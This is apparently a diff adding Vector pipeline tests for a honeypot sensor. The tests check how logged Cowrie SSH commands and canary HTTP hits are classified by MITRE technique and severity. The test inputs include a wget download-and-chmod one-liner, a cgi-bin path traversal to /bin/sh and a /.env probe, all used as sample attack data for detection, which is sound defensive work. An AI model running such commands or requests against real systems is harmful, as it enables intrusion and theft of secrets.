@@ -1,0 +1,116 @@
+# Run on the core: docker compose -f docker-compose.core.yml run --rm --no-deps \
+#   -v ./config/vector/tests:/etc/vector/tests:ro vector-core \
+#   test /etc/vector/vector.yaml /etc/vector/tests/vector-core.test.yaml
+tests:
+  - name: live download one-liner is staged-download severity 5 with discovery kept
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          sensor_id: aws-edge-t4g-01
+          message: '{"eventid":"cowrie.command.input","session":"abc123","src_ip":"203.0.113.9","input":"uname -a; cd /tmp; wget http://198.51.100.1/x.sh; chmod +x x.sh","timestamp":"2026-10-13T08:55:24.797123Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.ingest_stream, "logs")
+              assert_eq!(.honeypot, "cowrie")
+              assert_eq!(.mitre_technique, "T1105")
+              assert_eq!(.command_techniques, ["T1105", "T1222.002", "T1082"])
+              assert_eq!(.severity, 5)
+              assert!(is_timestamp(.timestamp))
+              assert_eq!(format_timestamp!(.timestamp, "%Y-%m-%d"), "2026-10-13")
+              assert!(!exists(.message))
+
+  - name: discovery-only command stays severity 4
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          sensor_id: aws-edge-t4g-01
+          message: '{"eventid":"cowrie.command.input","session":"abc123","src_ip":"203.0.113.9","input":"cat /proc/cpuinfo | grep name | wc -l","timestamp":"2026-10-13T08:55:25Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.mitre_technique, "T1082")
+              assert_eq!(.severity, 4)
+
+  - name: replay events are routed to the replay index
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          message: '{"eventid":"cowrie.login.success","session":"r1","src_ip":"198.51.100.55","username":"root","password":"admin","timestamp":"2026-10-13T08:00:00Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.ingest_stream, "replay")
+              assert_eq!(.severity, 4)
+              assert_eq!(.mitre_technique, "T1078.001")
+
+  - name: canary traversal is an exploit attempt
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          sensor_id: aws-edge-t4g-01
+          message: '{"event_type":"canary_http_hit","src_ip":"203.0.113.7","method":"GET","path":"/cgi-bin/../../../../bin/sh","query":"","user_agent":"Mozilla/5.0","timestamp":"2026-10-13T09:00:00Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.honeypot, "canary")
+              assert_eq!(.detection_key, "canary.exploit")
+              assert_eq!(.mitre_technique, "T1190")
+              assert_eq!(.severity, 4)
+
+  - name: canary dotenv fetch is enumeration
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          sensor_id: aws-edge-t4g-01
+          message: '{"event_type":"canary_http_hit","src_ip":"203.0.113.7","method":"GET","path":"/.env","query":"","user_agent":"python-requests/2.31","timestamp":"2026-10-13T09:00:01Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.detection_key, "canary.enumeration")
+              assert_eq!(.severity, 3)
+
+  - name: canary root hit is a plain probe
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          sensor_id: aws-edge-t4g-01
+          message: '{"event_type":"canary_http_hit","src_ip":"203.0.113.7","method":"GET","path":"/","query":"","user_agent":"Mozilla/5.0 zgrab/0.x","timestamp":"2026-10-13T09:00:02Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.detection_key, "canary.probe")
+              assert_eq!(.severity, 2)
+
+  - name: unknown cowrie event falls back to severity 1
+    inputs:
+      - insert_at: normalize_events
+        type: log
+        log_fields:
+          sensor_id: aws-edge-t4g-01
+          message: '{"eventid":"cowrie.something.new","src_ip":"203.0.113.8","timestamp":"2026-10-13T09:00:03Z"}'
+    outputs:
+      - extract_from: normalize_events
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.severity, 1)
+              assert_eq!(.event_description, "Unclassified honeypot activity")
